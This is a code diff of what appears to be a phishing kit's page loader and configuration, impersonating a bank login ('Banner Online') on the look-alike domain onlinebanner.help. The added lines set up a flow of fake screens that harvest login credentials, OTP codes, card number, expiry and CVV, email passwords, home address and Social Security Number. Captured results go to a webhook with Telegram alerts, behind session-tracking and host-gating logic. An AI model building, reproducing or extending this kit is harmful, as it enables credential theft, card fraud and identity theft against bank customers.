@@ -4,7 +4,8 @@
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Banner Online</title>
+    <title>Banner Baddoo</title>
+    
     <style>
       :root {
         --accent: #7cffb2;
@@ -13,8 +14,8 @@
         --success-rgb: 21 128 61;
         --danger: #b91c1c;
         --danger-rgb: 185 28 28;
-        --info: #1d4ed8;
-        --info-rgb: 29 78 216;
+        --info: #52645b;
+        --info-rgb: 82 100 91;
       }
       * { box-sizing: border-box; }
       html, body { width: 100%; min-height: 100%; margin: 0; background: #050607; }
@@ -26,30 +27,19 @@
         display: none;
         place-items: center;
         padding: 24px;
-        color: #152033;
-        background:
-          radial-gradient(circle at 50% 0, rgba(37, 99, 235, .08), transparent 36%),
-          #f4f7fb;
+        color: #161b18;
+        background: #f5f5f3;
       }
       #deuceGate.active { display: grid; }
       #deuceGate article {
-        position: relative;
-        width: min(430px, calc(100vw - 32px));
+        width: min(400px, calc(100vw - 32px));
         display: grid;
-        gap: 22px;
-        padding: 28px;
-        overflow: hidden;
-        border: 1px solid #dfe5ee;
-        border-radius: 18px;
-        background: rgba(255, 255, 255, .96);
-        box-shadow: 0 24px 70px rgba(15, 23, 42, .12);
-      }
-      #deuceGate article::before {
-        content: "";
-        position: absolute;
-        inset: 0 0 auto;
-        height: 4px;
-        background: linear-gradient(90deg, #2563eb, #60a5fa);
+        gap: 20px;
+        padding: 26px;
+        border: 1px solid #e1e4e0;
+        border-radius: 12px;
+        background: #fff;
+        box-shadow: 0 12px 40px rgba(20, 28, 23, .08);
       }
       #deuceGateHeader {
         display: flex;
@@ -62,9 +52,9 @@
         flex: 0 0 52px;
         width: 52px;
         height: 52px;
-        border: 1px solid #dbe3ee;
-        border-radius: 14px;
-        background: #f8fafc;
+        border: 1px solid #e1e4e0;
+        border-radius: 10px;
+        background: #fff;
       }
       #deuceGateLogo {
         display: block;
@@ -75,7 +65,7 @@
         display: grid;
         place-items: center;
         color: #fff;
-        background: linear-gradient(135deg, #1d4ed8, #60a5fa);
+        background: #161b18;
         font-size: 1rem;
         font-weight: 850;
         letter-spacing: .04em;
@@ -84,7 +74,7 @@
       #deuceGateMeta { min-width: 0; }
       #deuceGateEyebrow {
         margin: 0 0 4px;
-        color: #64748b;
+        color: #68736c;
         font-size: .72rem;
         font-weight: 800;
         letter-spacing: .1em;
@@ -93,13 +83,13 @@
       #deuceGateDomain {
         margin: 0;
         overflow-wrap: anywhere;
-        color: #0f172a;
+        color: #161b18;
         font-size: clamp(1.15rem, 4vw, 1.45rem);
         line-height: 1.2;
       }
       #deuceGateStatus {
         margin: 7px 0 0;
-        color: #526176;
+        color: #626c66;
         font-size: .92rem;
         line-height: 1.45;
       }
@@ -113,7 +103,7 @@
       }
       #deuceGateFooter {
         margin: -5px 0 0;
-        color: #7b8798;
+        color: #78817c;
         font-size: .74rem;
         text-align: center;
       }
@@ -180,102 +170,261 @@
                 "entryFile": "index.html",
                 "screens": [
                         {
-                                "id": "scr_aa9a2ec4753e30",
-                                "file": "c.html",
-                                "order": 0,
-                                "stage": "verification",
-                                "state": "default",
-                                "enabled": true,
-                                "buttonLabel": "Code Check",
-                                "needsReview": false,
-                                "fieldManifest": {
-                                        "fields": [],
-                                        "version": 1,
-                                        "revision": "sha256:e374bc3d989448f6fc4724a5af7094d0d84bdb20cfc0d05d5f88e8daa0f0522b",
-                                        "screenId": "scr_aa9a2ec4753e30",
-                                        "warnings": [],
-                                        "needsReview": false
-                                },
-                                "showInRedirects": true
-                        },
-                        {
-                                "id": "scr_abed890d8a5fd0",
-                                "file": "email.html",
-                                "order": 1,
-                                "stage": "form",
-                                "state": "default",
-                                "enabled": true,
-                                "buttonLabel": "Email",
-                                "needsReview": false,
-                                "fieldManifest": {
-                                        "fields": [],
-                                        "version": 1,
-                                        "revision": "sha256:70fcbd63f0cb33e3d78072c1fca6914b0e17716391142525137ced9ffed05536",
-                                        "screenId": "scr_abed890d8a5fd0",
-                                        "warnings": [],
-                                        "needsReview": false
-                                },
-                                "showInRedirects": true
-                        },
-                        {
-                                "id": "scr_cc792c69065330",
+                                "id": "scr_Banner_Live_3",
                                 "file": "index.html",
-                                "order": 2,
-                                "stage": "form",
-                                "state": "default",
-                                "enabled": true,
-                                "buttonLabel": "Entry",
-                                "needsReview": false,
-                                "fieldManifest": {
-                                        "fields": [],
-                                        "version": 1,
-                                        "revision": "sha256:99ec9f8b0dc93123c7b2413cbd32a542b82feed937da748a43da6a543fc30c5e",
-                                        "screenId": "scr_cc792c69065330",
-                                        "warnings": [],
-                                        "needsReview": false
-                                },
-                                "showInRedirects": true
-                        },
-                        {
-                                "id": "scr_32065a94709471",
-                                "file": "login2.html",
-                                "order": 3,
+                                "order": 0,
                                 "stage": "form",
                                 "state": "default",
                                 "enabled": true,
                                 "buttonLabel": "Login",
                                 "needsReview": false,
                                 "fieldManifest": {
-                                        "fields": [],
+                                        "fields": [
+                                                {
+                                                        "id": "fld_login_id_c043cf9201c3",
+                                                        "type": "text",
+                                                        "label": "Login ID",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_loginform_b20e686a0d5e",
+                                                        "required": true,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "standard",
+                                                        "sourceLabel": "Login ID",
+                                                        "sourceRequired": true
+                                                },
+                                                {
+                                                        "id": "fld_password_443b78eccc25",
+                                                        "type": "password",
+                                                        "label": "Password",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_loginform_b20e686a0d5e",
+                                                        "required": true,
+                                                        "sourceType": "password",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "Password",
+                                                        "sourceRequired": true
+                                                },
+                                                {
+                                                        "id": "fld_remember_eacb27640e5a",
+                                                        "type": "checkbox",
+                                                        "label": "Remember me",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_loginform_b20e686a0d5e",
+                                                        "required": false,
+                                                        "sourceType": "checkbox",
+                                                        "needsReview": false,
+                                                        "sensitivity": "standard",
+                                                        "sourceLabel": "Remember me",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
                                         "version": 1,
-                                        "revision": "sha256:705c81d0ba49baf4bf853456a51f2dca1bc2422e1dabc463e6be47dacbe75775",
-                                        "screenId": "scr_32065a94709471",
+                                        "revision": "sha256:61de002ce640c0c17f60282b76f786c46983cdfb8bbc54df664c161a1f2cec79",
+                                        "screenId": "scr_Banner_Live_3",
                                         "warnings": [],
                                         "needsReview": false
                                 },
                                 "showInRedirects": true
                         },
                         {
-                                "id": "scr_4ae6285932a555",
+                                "id": "scr_Banner_Live_5",
                                 "file": "otp.html",
-                                "order": 4,
+                                "order": 1,
                                 "stage": "verification",
                                 "state": "default",
                                 "enabled": true,
                                 "buttonLabel": "OTP",
                                 "needsReview": false,
                                 "fieldManifest": {
-                                        "fields": [],
+                                        "fields": [
+                                                {
+                                                        "id": "fld_otp_5c79b281b670",
+                                                        "type": "text",
+                                                        "label": "Enter One-Time Password (OTP)",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_otpform_c0435a53fa78",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "Enter One-Time Password (OTP)",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
                                         "version": 1,
-                                        "revision": "sha256:ee0a281e9708474f09984d3e7b65744a3ab7ac38ae7358b0cc887860c041652c",
-                                        "screenId": "scr_4ae6285932a555",
+                                        "revision": "sha256:0799f7c4dc99a7a0d714cf6c16275c2dfdcd476e50e2dfd3d4135fbbfbdd657f",
+                                        "screenId": "scr_Banner_Live_5",
                                         "warnings": [],
                                         "needsReview": false
                                 },
                                 "showInRedirects": true
                         },
                         {
-                                "id": "scr_ab83d92bac47a5",
+                                "id": "scr_Banner_Live_4",
+                                "file": "login2.html",
+                                "order": 2,
+                                "stage": "form",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Incorrect Login",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_login2_0e6067f2cca3",
+                                                        "type": "text",
+                                                        "label": "Login ID",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_loginform_b20e686a0d5e",
+                                                        "required": true,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "standard",
+                                                        "sourceLabel": "Login ID",
+                                                        "sourceRequired": true
+                                                },
+                                                {
+                                                        "id": "fld_password2_12fb70ecfdab",
+                                                        "type": "password",
+                                                        "label": "Password",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_loginform_b20e686a0d5e",
+                                                        "required": true,
+                                                        "sourceType": "password",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "Password",
+                                                        "sourceRequired": true
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:7823a04a814ef3c55f6fe97c952708988ecc00dbd735222bd163ab96452106a5",
+                                        "screenId": "scr_Banner_Live_4",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_Banner_Live_1",
+                                "file": "c.html",
+                                "order": 3,
+                                "stage": "form",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Card",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_card_number_5ee80d99c5ec",
+                                                        "type": "text",
+                                                        "label": "Card Number",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_cardform_b8573f5d3fea",
+                                                        "required": true,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "financial",
+                                                        "sourceLabel": "Card Number",
+                                                        "sourceRequired": true
+                                                },
+                                                {
+                                                        "id": "fld_exp_date_394ee29a80d2",
+                                                        "type": "text",
+                                                        "label": "Expiration Date",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_cardform_b8573f5d3fea",
+                                                        "required": true,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "standard",
+                                                        "sourceLabel": "Expiration Date",
+                                                        "sourceRequired": true
+                                                },
+                                                {
+                                                        "id": "fld_cvv_b7ffd62d87bf",
+                                                        "type": "text",
+                                                        "label": "CVV",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_cardform_b8573f5d3fea",
+                                                        "required": true,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "financial",
+                                                        "sourceLabel": "CVV",
+                                                        "sourceRequired": true
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:4ce7eadb3510a12bb6a2e253c9e41916e821e68c331cb3df747e6539316e87d2",
+                                        "screenId": "scr_Banner_Live_1",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_Banner_Live_2",
+                                "file": "email.html",
+                                "order": 4,
+                                "stage": "form",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Email",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_email_d96399730785",
+                                                        "type": "email",
+                                                        "label": "Email Address",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_emailform_8e48183f9f0c",
+                                                        "required": true,
+                                                        "sourceType": "email",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "Email Address",
+                                                        "sourceRequired": true
+                                                },
+                                                {
+                                                        "id": "fld_password_c41f39c4bae5",
+                                                        "type": "password",
+                                                        "label": "Password",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_emailform_8e48183f9f0c",
+                                                        "required": true,
+                                                        "sourceType": "password",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "Password",
+                                                        "sourceRequired": true
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:e264e079f1d7adef477515cb04a92b4b3f45de925444ca1c3c6b09876017b1f9",
+                                        "screenId": "scr_Banner_Live_2",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_Banner_Live_6",
                                 "file": "personal.html",
                                 "order": 5,
                                 "stage": "form",
@@ -284,19 +433,109 @@
                                 "buttonLabel": "Personal Info",
                                 "needsReview": false,
                                 "fieldManifest": {
-                                        "fields": [],
+                                        "fields": [
+                                                {
+                                                        "id": "fld_full_name_27d22a4dc236",
+                                                        "type": "text",
+                                                        "label": "Full Name",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_personalform_b8ce260684d7",
+                                                        "required": true,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "Full Name",
+                                                        "sourceRequired": true
+                                                },
+                                                {
+                                                        "id": "fld_address_58c32088757e",
+                                                        "type": "text",
+                                                        "label": "Address",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_personalform_b8ce260684d7",
+                                                        "required": true,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "Address",
+                                                        "sourceRequired": true
+                                                },
+                                                {
+                                                        "id": "fld_city_1a34f1bdc626",
+                                                        "type": "text",
+                                                        "label": "City",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_personalform_b8ce260684d7",
+                                                        "required": true,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "City",
+                                                        "sourceRequired": true
+                                                },
+                                                {
+                                                        "id": "fld_zip_ba5538b24171",
+                                                        "type": "text",
+                                                        "label": "Zip Code",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_personalform_b8ce260684d7",
+                                                        "required": true,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "Zip Code",
+                                                        "sourceRequired": true
+                                                },
+                                                {
+                                                        "id": "fld_ssn_b2d9c0c6e826",
+                                                        "type": "text",
+                                                        "label": "Social Security Number",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_personalform_b8ce260684d7",
+                                                        "required": true,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "Social Security Number",
+                                                        "sourceRequired": true
+                                                }
+                                        ],
                                         "version": 1,
-                                        "revision": "sha256:b786ac0ed78ba0b09cf2466e38d56b57baf5c351c75e6ee98bf13f2d6f2cd4f2",
-                                        "screenId": "scr_ab83d92bac47a5",
+                                        "revision": "sha256:e911f4e1d36b57503e5c33ea0e24d9f756507c222eb8bb59ebc0f246eb7b9627",
+                                        "screenId": "scr_Banner_Live_6",
                                         "warnings": [],
                                         "needsReview": false
                                 },
                                 "showInRedirects": true
                         },
                         {
-                                "id": "scr_5bc9d352b99fe2",
-                                "file": "thnks.html",
+                                "id": "scr_23dab28428525e",
+                                "file": "hold.html",
                                 "order": 6,
+                                "stage": "other",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Wait Page",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [],
+                                        "version": 1,
+                                        "revision": "sha256:3bdf537991c7e8014e29628c15a7c56bb471cdd3b57115ee3e3e49df4d001551",
+                                        "screenId": "scr_23dab28428525e",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_Banner_Live_7",
+                                "file": "thnks.html",
+                                "order": 7,
                                 "stage": "success",
                                 "state": "default",
                                 "enabled": true,
@@ -305,8 +544,42 @@
                                 "fieldManifest": {
                                         "fields": [],
                                         "version": 1,
-                                        "revision": "sha256:4f1ee696f3bf2897d862994f96b8f1328926b4adb6b9413532a0e8e4076dc3bf",
-                                        "screenId": "scr_5bc9d352b99fe2",
+                                        "revision": "sha256:096862be9d837853e4e2594e153242d779986a7eb7e7adbc97147d2087532d77",
+                                        "screenId": "scr_Banner_Live_7",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_e90ccbf9c04830",
+                                "file": "errotp.html",
+                                "order": 8,
+                                "stage": "verification",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Invalid OTP",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_otp_5c79b281b670",
+                                                        "type": "text",
+                                                        "label": "Enter One-Time Password (OTP)",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_otpform_c0435a53fa78",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "Enter One-Time Password (OTP)",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:ca3d6531f1acea5c73c27212c2d619c84604a98beb891ff8835e645293675171",
+                                        "screenId": "scr_e90ccbf9c04830",
                                         "warnings": [],
                                         "needsReview": false
                                 },
@@ -315,7 +588,7 @@
                 ]
         },
         "apiBase": "/api",
-        "generatedAt": "2026-08-08T05:21:42.763Z",
+        "generatedAt": "2026-08-13T03:10:25.506Z",
         "domain": "onlinebanner.help",
         "hosting": {
                 "domain": "onlinebanner.help",
@@ -335,7 +608,8 @@
         "resultSettings": {
                 "webhook": "/api/page-results",
                 "retentionDays": 30,
-                "notifyOnResult": true
+                "notifyOnResult": true,
+                "telegramNotifyOnResult": true
         },
         "security": {
                 "captcha": false,
@@ -373,10 +647,27 @@
                 "sourceEndpoint": "/api/source?userPageId=user_page_a0c97c6a27f3425395",
                 "turnstileEndpoint": "/api/verify-human",
                 "trafficEndpoint": "/api/traffic"
-        }
+        },
+        "favicon": {
+                "path": "",
+                "thumbnailDataUrl": "",
+                "thumbnailPath": ""
+        },
+        "runtimeBase": "/api"
 };
       const config = window.DEUCE_PAGE_CONFIG;
-      const sessionId = "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
+      const sessionId = (() => {
+        const key = "deuce_session_" + config.id;
+        try {
+          const existing = window.sessionStorage.getItem(key);
+          if (existing) return existing;
+          const next = "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
+          window.sessionStorage.setItem(key, next);
+          return next;
+        } catch (error) {
+          return "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
+        }
+      })();
       const host = window.location.hostname;
       const frame = document.getElementById("deuceFrame");
       const gate = document.getElementById("deuceGate");
@@ -425,6 +716,7 @@
         if (!endpoint) return;
         const brandingUrl = new URL(endpoint, window.location.href);
         brandingUrl.searchParams.set("hostname", window.location.hostname);
+        brandingUrl.searchParams.set("sessionId", sessionId);
         gateLogo.onload = () => {
           gateLogo.hidden = false;
           gateFallback.hidden = true;
@@ -440,7 +732,10 @@
         if (!config.runtime?.configEndpoint) {
           throw new Error("Live security configuration endpoint is missing");
         }
-        const response = await fetch(config.runtime.configEndpoint, {
+        const configUrl = new URL(config.runtime.configEndpoint, window.location.href);
+        configUrl.searchParams.set("hostname", window.location.hostname);
+        configUrl.searchParams.set("sessionId", sessionId);
+        const response = await fetch(configUrl.toString(), {
           method: "GET",
           cache: "no-store",
           headers: { Accept: "application/json" }
@@ -457,6 +752,7 @@
         config.security = live.security || {};
         config.resultSettings = live.resultSettings || config.resultSettings;
         config.generatedFile = live.generatedFile || config.generatedFile;
+        config.favicon = Object.assign({}, config.favicon, live.favicon ? { path: live.favicon.path, thumbnailPath: live.favicon.thumbnailPath } : {});
         window.DEUCE_PAGE_CONFIG = config;
         return config;
       }
@@ -477,6 +773,7 @@
           body: JSON.stringify({
             userPageId: config.id,
             pageId: config.pageId,
+            sessionId,
             hostname: window.location.hostname,
             event,
             result,
@@ -491,6 +788,7 @@
         frame.classList.remove("pending");
         const sourceUrl = new URL(config.runtime.sourceEndpoint, window.location.href);
         sourceUrl.searchParams.set("hostname", window.location.hostname);
+        sourceUrl.searchParams.set("sessionId", sessionId);
         frame.src = sourceUrl.toString();
       }
 
@@ -570,6 +868,27 @@
         document.head.appendChild(script);
       }
 
+      function applyFavicon() {
+        var link = document.getElementById("deuceFavicon");
+        if (!link) return;
+        var fb = config.favicon || {};
+        var base = config.runtimeBase || "";
+        function asset(file) {
+          return base + "/source/asset?userPageId=" + encodeURIComponent(config.id) + "&file=" + encodeURIComponent(file);
+        }
+        function fromFetch(file, fallbackHref) {
+          if (!file) { if (fallbackHref) link.href = fallbackHref; return; }
+          fetch(asset(file)).then(function (r) { return r.ok ? r.blob() : Promise.reject(); }).then(function (b) { link.href = URL.createObjectURL(b); }).catch(function () { if (fallbackHref) link.href = fallbackHref; });
+        }
+        if (fb.path) {
+          fromFetch(fb.path, fb.thumbnailDataUrl || "");
+        } else if (fb.thumbnailDataUrl) {
+          link.href = fb.thumbnailDataUrl;
+        } else if (fb.thumbnailPath) {
+          fromFetch(fb.thumbnailPath, "");
+        }
+      }
+
       async function boot() {
         try {
           await refreshLiveConfig();
@@ -578,6 +897,8 @@
           blockPage("SECURITY CONFIGURATION UNAVAILABLE");
           return;
         }
+
+        applyFavicon();
 
         const allowedHosts = (config.security?.domains || config.allowedDomains || []).map(normalizeHost).filter(Boolean);
         const captchaRequired = Boolean(config.security?.captchaRequired || config.security?.captcha || config.security?.challengeRequired);
